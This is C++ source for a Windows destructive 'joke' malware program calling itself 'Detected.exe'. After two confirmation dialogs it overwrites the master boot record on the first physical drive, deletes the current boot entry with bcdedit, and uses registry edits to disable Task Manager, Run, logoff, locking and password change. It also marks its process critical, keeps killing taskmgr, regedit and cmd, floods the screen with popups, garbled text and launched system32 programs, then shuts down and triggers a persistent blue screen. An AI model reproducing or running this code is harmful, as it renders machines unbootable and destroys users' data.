#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
//#include "DisableFunction.h"
#include "bootrec.h"
#include "Hardshutdown.h"
#include <windows.h>
#include <cstdlib>


DWORD WINAPI opener(LPVOID lpParam) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
	while (true) {
		HANDLE find = FindFirstFileW(path, &data);
		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(rand() % 250);
		}
	}
}

DWORD WINAPI beep(LPVOID lpParam) {
    while (true) {
        Beep(rand() % 2400, rand() % 255);
    }
}

DWORD WINAPI NoTaskmgr(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	return 1;
}

DWORD WINAPI msg(LPVOID lpParam)
{
	for (int i = 0; i < INFINITE; i++)
	{
		MessageBox(NULL, TEXT("The If Too.."), TEXT("Unknown Error"), MB_CANCELTRYCONTINUE | MB_ICONERROR);
		std::cout << "i = " << i << std::endl;
	}
	return 0;
}


DWORD WINAPI garbled(LPVOID lpParam) {
	const char* alphanum[] = {
		"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "q", "w", "e", "r", "t",
		"z", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "y",
		"x", "c", "v", "b", "n", "m", "Q", "W", "E", "R", "T", "Z", "U", "I", "O",
		"P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Y", "X", "C", "V", "B",
		"N", "M", ".", ",", " ", "$", "#", "&", "@", "!", "?",
	};
	int nText = sizeof(alphanum) / sizeof(alphanum[0]);

	char text[70];

	HWND hwnd = GetForegroundWindow();

	// Function to generate random garbled text
	auto generateText = [&]() {
		for (int i = 0; i < sizeof(text) - 1; ++i) {
			text[i] = alphanum[rand() % nText][0];
		}
		text[sizeof(text) - 1] = '\0'; // Null-terminate the string
		};

	// Callback function to update each child control's text
	auto updateControlText = [](HWND hwnd, LPARAM lParam) -> BOOL {
		char* text = reinterpret_cast<char*>(lParam);
		SetWindowTextA(hwnd, text);
		return TRUE;
		};

	while (true) {
		generateText();

		// Change the main window's title
		SetWindowTextA(hwnd, text);

		// Enumerate and change the text of all child controls
		EnumChildWindows(hwnd, updateControlText, reinterpret_cast<LPARAM>(text));

		Sleep(5);
	}
	return 0;
}

DWORD WINAPI notaskbar(LPVOID lpvd) {
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}

DWORD WINAPI spamkill(LPVOID lpParam)
{
	while (1)
	{
		ShellExecuteA(NULL, NULL, "taskkill", "/f /im taskmgr.exe", NULL, SW_SHOWDEFAULT);
		Sleep(1);
		ShellExecuteA(NULL, NULL, "taskkill", "/f /im regedit.exe", NULL, SW_SHOWDEFAULT);
		Sleep(1);
		ShellExecuteA(NULL, NULL, "taskkill", "/f /im cmd.exe", NULL, SW_SHOWDEFAULT);
		Sleep(1);
	}
	return 666;
}

DWORD WINAPI WindowMax(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	RECT rekt;

	while (true) {
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &rekt);

		int sel = rand() % 4 + 1;

		if (rekt.left >= x) {
			rekt.left = 0;
		}
		else if (rekt.top >= y) {
			rekt.top = 0;
		}
		else if (rekt.left <= 0) {
			rekt.left = 0;
		}
		else if (rekt.top <= 0) {
			rekt.top = 0;
		}

		int xs = rekt.left;
		int ys = rekt.top;
		int rnd = rand() % 100 + 60;

		for (int i = 0; i < rnd; i += 20) {
			if (sel == 1) {
				SetWindowPos(hwnd, 0, xs + i, ys + i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 2) {
				SetWindowPos(hwnd, 0, xs - i, ys + i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 3) {
				SetWindowPos(hwnd, 0, xs + i, ys - i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 4) {
				SetWindowPos(hwnd, 0, xs - i, ys - i, xs, ys, 0);
				Sleep(10);
			}
		}
	}
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"A Malware Run?", L"Detected.exe (Non-GDI)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure?", L"Detected.exe (Non-GDI)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			CreateThread(0, 0, NoTaskmgr, 0, 0, 0);
			Sleep(3000);
			CreateThread(0, 0, msg, 0, 0, 0);
			Sleep(2000);
			CreateThread(0, 0, beep, 0, 0, 0);
			CreateThread(0, 0, notaskbar, 0, 0, 0);
			CreateThread(0, 0, spamkill, 0, 0, 0);
			Sleep(8000);
			HANDLE MessText = CreateThread(0, 0, garbled, 0, 0, 0);
			Sleep(10000);
			HANDLE Move = CreateThread(0, 0, WindowMax, 0, 0, 0);
			Sleep(10000);
			//starts Open Random Program
			HANDLE System = CreateThread(0, 0, opener, 0, 0, 0);
			Sleep(100000);
			ShellExecuteA(NULL, NULL, "shutdown", "/s", NULL, SW_SHOWDEFAULT);
			Sleep(3000);
			//system's death.
			TriggerPersistentBSOD();
		}
	}
}